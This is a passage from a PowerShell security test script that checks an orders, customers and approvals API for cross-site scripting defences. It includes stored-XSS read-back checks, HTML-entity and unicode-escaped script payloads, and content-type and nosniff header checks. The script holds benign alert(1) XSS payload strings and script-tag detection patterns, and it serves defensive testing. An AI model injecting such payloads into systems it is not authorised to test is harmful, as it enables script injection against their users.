    } elseif ($r.code -ge 200 -and $r.code -lt 300) {
        Warn "H1: XSS comment accepted (will check on read-back)"
    } else {
        Warn "H1: Unexpected response $($r.code) - $(Get-ErrorMsg $r)"
    }

    Write-Host ""
    Write-Host "=== TEST H2: Read back comments ===" -ForegroundColor White
    $r = Api-Expect "GET" "/approvals/$APPR_ID/comments" $ADMIN
    Write-Host "  HTTP $($r.code)" -ForegroundColor Gray
    if ($r.code -ge 200 -and $r.code -lt 300) {
        Pass "H2: Comments retrieved successfully"
    } else {
        Warn "H2: Could not retrieve comments ($($r.code))"
    }

    Write-Host ""
    Write-Host "=== TEST H3: Verify comment does not contain raw script ===" -ForegroundColor White
    if ($r.code -ge 200 -and $r.code -lt 300) {
        if (Has-RawScript $r.rawContent) {
            # Check content-type
            $ct = $null
            if ($r.headers) {
                foreach ($key in $r.headers.Keys) {
                    if ($key -ieq "Content-Type") { $ct = $r.headers[$key]; break }
                }
            }
            if ($ct -and $ct -match "application/json") {
                Warn "H3: Raw <script> in comment response (JSON content-type mitigates execution)"
            } else {
                Fail "H3: Raw <script> in comment response with non-JSON content-type - stored XSS!"
            }
        } else {
            Pass "H3: No raw <script> in comment response (sanitized or rejected)"
        }
    } else {
        Warn "H3: Skipped - could not read comments"
    }

    Write-Host ""
    Write-Host "=== TEST H4: Comment response is JSON (safe content type) ===" -ForegroundColor White
    if ($r.code -ge 200 -and $r.code -lt 300 -and $r.headers) {
        $ct = $null
        foreach ($key in $r.headers.Keys) {
            if ($key -ieq "Content-Type") { $ct = $r.headers[$key]; break }
        }
        if ($ct -and $ct -match "application/json") {
            Pass "H4: Comments returned as application/json (prevents script execution)"
        } else {
            Fail "H4: Comments returned as $ct - stored XSS could execute!"
        }
    } else {
        Warn "H4: Skipped - no response to check"
    }
} else {
    Warn "H1: Skipped - no approval found"
    Warn "H2: Skipped - no approval found"
    Warn "H3: Skipped - no approval found"
    Warn "H4: Skipped - no approval found"
}

# ================================================================
# PART I: DOM-based XSS vectors (~3 tests)
# ================================================================
Write-Host ""
Write-Host "================================================================" -ForegroundColor Cyan
Write-Host "  PART I: DOM-based XSS vectors" -ForegroundColor Cyan
Write-Host "================================================================" -ForegroundColor Cyan

Write-Host ""
Write-Host "=== TEST I1: HTML entities in search ===" -ForegroundColor White
$encodedXss = [System.Uri]::EscapeDataString("&lt;script&gt;alert(1)&lt;/script&gt;")
$r = Api-Expect "GET" "/orders?search=$encodedXss" $SALE
Write-Host "  HTTP $($r.code)" -ForegroundColor Gray
if ($r.code -ge 200 -and $r.code -lt 300) {
    # Verify entities are NOT decoded into actual script tags
    if ($r.rawContent -match '<script[^>]*>alert\(1\)</script>' -and $r.rawContent -notmatch '&lt;script') {
        Fail "I1: HTML entities decoded to actual script tags - XSS!"
    } else {
        Pass "I1: HTML entities in search handled safely (not decoded to script)"
    }
} elseif ($r.code -eq 400) {
    Pass "I1: HTML entities in search rejected (400)"
} else {
    Warn "I1: Unexpected response $($r.code)"
}

Write-Host ""
Write-Host "=== TEST I2: Encoded HTML entities in text field ===" -ForegroundColor White
if ($CUST_ID) {
    $entityPayload = "&lt;script&gt;alert(1)&lt;/script&gt;"
    $r = Api-Expect "PATCH" "/customers/$CUST_ID" $SALE @{ note = $entityPayload }
    Write-Host "  HTTP $($r.code)" -ForegroundColor Gray
    if ($r.code -ge 200 -and $r.code -lt 300) {
        $readBack = D (Api "GET" "/customers/$CUST_ID" $SALE)
        if ($readBack -and $readBack.note) {
            if ($readBack.note -match '<script[^>]*>' -and $readBack.note -notmatch '&lt;') {
                Fail "I2: HTML entities decoded to script on storage - XSS!"
            } else {
                Pass "I2: HTML entities stored literally (not decoded to active script)"
            }
        } else {
            Warn "I2: Could not read back note"
        }
    } elseif ($r.code -eq 400) {
        Pass "I2: HTML entities in note rejected (400)"
    } else {
        Warn "I2: Unexpected response $($r.code)"
    }
} else {
    Warn "I2: Skipped - no customer found"
}

Write-Host ""
Write-Host "=== TEST I3: Unicode escape sequence in text field ===" -ForegroundColor White
if ($CUST_ID) {
    $unicodePayload = "\u003cscript\u003ealert(1)\u003c/script\u003e"
    $r = Api-Expect "PATCH" "/customers/$CUST_ID" $SALE @{ note = $unicodePayload }
    Write-Host "  HTTP $($r.code)" -ForegroundColor Gray
    if ($r.code -ge 200 -and $r.code -lt 300) {
        $readBack = D (Api "GET" "/customers/$CUST_ID" $SALE)
        if ($readBack -and $readBack.note) {
            # Check if unicode escapes were decoded to actual <script> tags
            if ($readBack.note -match '<script[^>]*>' -and $readBack.note -notmatch '\\u003c') {
                Warn "I3: Unicode escapes decoded to script tags (JSON API mitigates, but risky)"
            } else {
                Pass "I3: Unicode escapes handled safely (stored as literal or not decoded)"
            }
        } else {
            Warn "I3: Could not read back note"
        }
    } elseif ($r.code -eq 400) {
        Pass "I3: Unicode escape payload rejected (400)"
    } else {
        Warn "I3: Unexpected response $($r.code)"
    }

    # Restore note
    Api "PATCH" "/customers/$CUST_ID" $SALE @{ note = "" } | Out-Null
} else {
    Warn "I3: Skipped - no customer found"
}

# ================================================================
# PART J: Content-Type enforcement (~3 tests)
# ================================================================
Write-Host ""
Write-Host "================================================================" -ForegroundColor Cyan
Write-Host "  PART J: Content-Type enforcement" -ForegroundColor Cyan
Write-Host "================================================================" -ForegroundColor Cyan

Write-Host ""
Write-Host "=== TEST J1: All API responses are application/json ===" -ForegroundColor White
$endpoints = @(
    "/orders?limit=1",
    "/customers?limit=1",
    "/approvals?limit=1"
)
$allJson = $true
foreach ($ep in $endpoints) {
    $r = Api-Expect "GET" $ep $ADMIN
    $ct = $null
    if ($r.headers) {
        foreach ($key in $r.headers.Keys) {
            if ($key -ieq "Content-Type") { $ct = $r.headers[$key]; break }
        }
    }
    if (-not ($ct -and $ct -match "application/json")) {
        $allJson = $false
        Write-Host "    $ep -> Content-Type: $ct" -ForegroundColor Yellow
    }
}
if ($allJson) {
    Pass "J1: All tested API endpoints return application/json"
} else {
    Fail "J1: Some endpoints do NOT return application/json"
}

Write-Host ""
Write-Host "=== TEST J2: No text/html Content-Type in API responses ===" -ForegroundColor White
$hasHtml = $false
foreach ($ep in $endpoints) {
    $r = Api-Expect "GET" $ep $ADMIN
    $ct = $null
    if ($r.headers) {
        foreach ($key in $r.headers.Keys) {
            if ($key -ieq "Content-Type") { $ct = $r.headers[$key]; break }
        }
    }
    if ($ct -and $ct -match "text/html") {
        $hasHtml = $true
        Write-Host "    $ep -> text/html detected!" -ForegroundColor Red
    }
}
if (-not $hasHtml) {
    Pass "J2: No text/html Content-Type found in API responses"
} else {
    Fail "J2: text/html Content-Type found - XSS payloads would execute in browser!"
}

Write-Host ""
Write-Host "=== TEST J3: X-Content-Type-Options prevents MIME sniffing ===" -ForegroundColor White
$r = Api-Expect "GET" "/orders?limit=1" $SALE
$nosniff = $null
if ($r.headers) {
    foreach ($key in $r.headers.Keys) {
        if ($key -ieq "X-Content-Type-Options") { $nosniff = $r.headers[$key]; break }
    }
}
if ($nosniff -and $nosniff -match "nosniff") {
    Pass "J3: X-Content-Type-Options: nosniff prevents browser MIME sniffing (XSS mitigation)"
} else {
    Fail "J3: X-Content-Type-Options: nosniff missing - browser may interpret JSON as HTML!"
}

# ================================================================
# TONG KET
# ================================================================
Write-Host ""
Write-Host "================================================================" -ForegroundColor Cyan
Write-Host "  TONG KET TEST-SEC-011: XSS Prevention" -ForegroundColor Cyan
Write-Host "================================================================" -ForegroundColor Cyan
Write-Host ""
Write-Host "  Part A: Security Headers (CSP, X-Frame-Options, nosniff, HSTS)" -ForegroundColor Gray
Write-Host "  Part B: Script tag injection in search queries" -ForegroundColor Gray
Write-Host "  Part C: XSS in customer form fields (fullName, companyName, note)" -ForegroundColor Gray
Write-Host "  Part D: XSS in order notes/remarks" -ForegroundColor Gray
Write-Host "  Part E: XSS in URL fields (javascript:, data:, attribute injection)" -ForegroundColor Gray
Write-Host "  Part F: Various XSS payloads (SVG, nested tags, event handlers, template)" -ForegroundColor Gray
Write-Host "  Part G: XSS in login/auth fields (reflected XSS)" -ForegroundColor Gray
Write-Host "  Part H: Stored XSS via approval comments" -ForegroundColor Gray
Write-Host "  Part I: DOM-based XSS vectors (HTML entities, unicode escapes)" -ForegroundColor Gray
Write-Host "  Part J: Content-Type enforcement (JSON, no text/html, nosniff)" -ForegroundColor Gray
Write-Host ""
Write-Host "  NOTE: For JSON APIs, storing XSS payloads is a WARN (not FAIL)" -ForegroundColor Gray
Write-Host "  because application/json Content-Type prevents browser execution." -ForegroundColor Gray
Write-Host "  A FAIL means: missing security headers or text/html content type." -ForegroundColor Gray
Write-Host ""
Write-Host "  PASS: $passCount" -ForegroundColor Green
Write-Host "  FAIL: $failCount" -ForegroundColor Red
Write-Host "  WARN: $warnCount" -ForegroundColor Yellow
Write-Host ""
$totalTests = $passCount + $failCount + $warnCount
Write-Host "  TOTAL: $totalTests tests" -ForegroundColor White
Write-Host ""
if ($failCount -eq 0) {
    Write-Host "  RESULT: ALL TESTS PASSED" -ForegroundColor Green
} else {
    Write-Host "  RESULT: $failCount TEST(S) FAILED" -ForegroundColor Red
}
Write-Host "================================================================" -ForegroundColor Cyan
